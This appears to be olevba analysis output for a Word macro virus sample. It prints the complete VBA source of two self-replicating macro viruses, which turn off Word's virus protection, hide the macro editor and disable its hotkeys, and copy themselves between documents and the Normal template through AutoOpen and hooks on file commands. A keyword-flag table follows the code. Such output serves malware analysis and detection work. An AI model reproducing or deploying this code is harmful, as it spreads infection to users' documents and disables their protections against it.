olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-3ab22183603ff23426c2f3ba83a37b12dcc6e1f8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-3ab22183603ff23426c2f3ba83a37b12dcc6e1f8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'maint4/1/99 6:27:54 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
On Error GoTo out
'maint4/1/99 6:27:54 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
Options.VirusProtection = False
'maint4/1/99 6:27:54 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
Options.SaveNormalPrompt = False
'maint4/1/99 6:27:54 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
Options.ConfirmConversions = False
'maint4/1/99 6:27:54 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'maint4/1/99 6:27:54 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'maint4/1/99 6:27:54 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
If nt > 70 And ad > 0 Then GoTo out
'maint4/1/99 6:27:54 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
If nt < 70 Then
'maint4/1/99 6:27:54 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
End If
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
host.codemodule.AddFromFile ("c:\class.sys")
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
With host.codemodule
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
    For x = 1 To 4
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
    .deletelines 1
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
    Next x
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
End With
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
If nt < 70 Then
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
    With host.codemodule
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
    .replaceline 1, "Sub AutoClose()"
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
    .replaceline 71, "Sub ToolsMacro()"
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
    End With
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
End If
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
With host.codemodule
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
    For x = 2 To 72 Step 2
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
    Next x
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
End With
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
out:
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
End Sub
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
Sub ViewVBCode()
'maint4/1/99 6:27:55 PMEpson LQ-1070+ ESC/P 2 on LPT1:Document1Clippit
End Sub


-------------------------------------------------------------------------------
VBA MACRO CyberHack.bas 
in file: Virus.MSWord.Class.fm-3ab22183603ff23426c2f3ba83a37b12dcc6e1f8 - OLE stream: 'Macros/VBA/CyberHack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Macros By WinK'S Hacker
' Picture By Casper Satan

' Lebih baik mencoba dari pada tidak tahu sama sekali ...
' Mohon ma'af bila telah mengganggu Anda.
' Microsoft memang gila ! Nambahin fasilitas pemrogramannya
' keterlaluan untuk suatu word prosesor.
Public AlAsal
Public DokSave
Public Norok
Public Dokok
Sub CyInit()
    AlAsal = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Tahan
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub
Sub CyClose()
Application.DisplayAlerts = AlAsal
End Sub
Sub Dok2Nor()
    Call Tahan
    On Error GoTo Erw1
    Norok = False
    Set ad = ActiveDocument
    Set nt = NormalTemplate
    On Error GoTo Erh1a
    For I = 1 To nt.VBProject.VBComponents.Count
      NMacr = nt.VBProject.VBComponents(I).Name
      If NMacr = "CyberHack" Then Norok = True
      If (NMacr <> "CyberHack") And (NMacr <> "CyberForm") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=nt.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next I
Erh1a:
    If Norok = False Then
      On Error GoTo Erh1
      Application.OrganizerCopy Source:=ad.FullName, _
          Destination:=nt.FullName, Name:= _
          "CyberHack", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=ad.FullName, _
          Destination:=nt.FullName, Name:= _
          "CyberForm", Object:=wdOrganizerObjectProjectItems
      Templates(nt.FullName).Save
Erh1:
    End If
Erw1:
End Sub
Sub Nor2Dok()
    On Error GoTo Erw2
    DokSave = 0
    Dokok = False
    Set ad = ActiveDocument
    Set nt = NormalTemplate
    On Error GoTo Erh2a
    For I = 1 To ad.VBProject.VBComponents.Count
      NMacr = ad.VBProject.VBComponents(I).Name
      If NMacr = "CyberHack" Then Dokok = True
      NMacr = nt.VBProject.VBComponents(I).Name
      If NMacr = "CyberHack" Then Dokok = True
      If (NMacr <> "CyberHack") And (NMacr <> "CyberForm") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=ad.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next I
Erh2a:
    If Dokok = False Then
      On Error GoTo Erh2
      
      Application.OrganizerCopy Source:=nt.FullName, _
          Destination:=ad.FullName, Name:= _
          "CyberHack", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=nt.FullName, _
          Destination:=ad.FullName, Name:= _
          "CyberForm", Object:=wdOrganizerObjectProjectItems
      DokSave = 1
Erh2:
    End If
Erw2:
End Sub
Sub Cyber()
    Call CyInit
    Call Dok2Nor
    Call CyClose
End Sub
Sub Tahan()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Simpan()
    On Error GoTo Erh4
Set ad = ActiveDocument
    If DokSave = 1 Then
       ad.SaveAs FileName:=ad.Name, FileFormat:=wdFormatDocument
    End If
Erh4:
End Sub
Sub AutoOpen()
    Call Cyber
End Sub
Sub FileClose()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    WordBasic.FileClose
End Sub
Sub FileOpen()
    Call Cyber
    Dialogs(wdDialogFileOpen).Show
    Call CyInit
    Call Nor2Dok
    Call Simpan
    Call CyClose
End Sub
Sub FileSaveAs()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    On Error GoTo Errh1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Errh1:
End Sub
Sub HelpAbout()
    On Error GoTo Erw3
    CyberForm.Show
Erw3:
End Sub
Sub FileExit()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    On Error GoTo Erw4
    If WeekDay(Date) = 6 Then CyberForm.Show
Erw4:
    Call CyClose
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call Cyber
End Sub
Sub FileNew()
    Call Cyber
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
    Call Cyber
End Sub
Sub ToolsCustomize()
    Call Cyber
End Sub
Sub ToolsCustomizeKeyboard()
    Call Cyber
End Sub
Sub ViewVBCode()
    Call Cyber
End Sub
Sub Organizer()
End Sub





.........................
-------------------------------------------------------------------------------
VBA MACRO CyberForm.frm 
in file: Virus.MSWord.Class.fm-3ab22183603ff23426c2f3ba83a37b12dcc6e1f8 - OLE stream: 'Macros/VBA/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

























































































Private Sub CommandButton1_Click()
Unload Me
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.fm-3ab22183603ff23426c2f3ba83a37b12dcc6e1f8' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Booke
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.fm-3ab22183603ff23426c2f3ba83a37b12dcc6e1f8' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Raleigh DmBd BTr
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.fm-3ab22183603ff23426c2f3ba83a37b12dcc6e1f8' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Casper'S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.fm-3ab22183603ff23426c2f3ba83a37b12dcc6e1f8' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.fm-3ab22183603ff23426c2f3ba83a37b12dcc6e1f8' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WinK'S@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.fm-3ab22183603ff23426c2f3ba83a37b12dcc6e1f8' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Class.fm-3ab22183603ff23426c2f3ba83a37b12dcc6e1f8' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Class.fm-3ab22183603ff23426c2f3ba83a37b12dcc6e1f8' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN 'Virus.MSWord.Class.fm-3ab22183603ff23426c2f3ba83a37b12dcc6e1f8' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
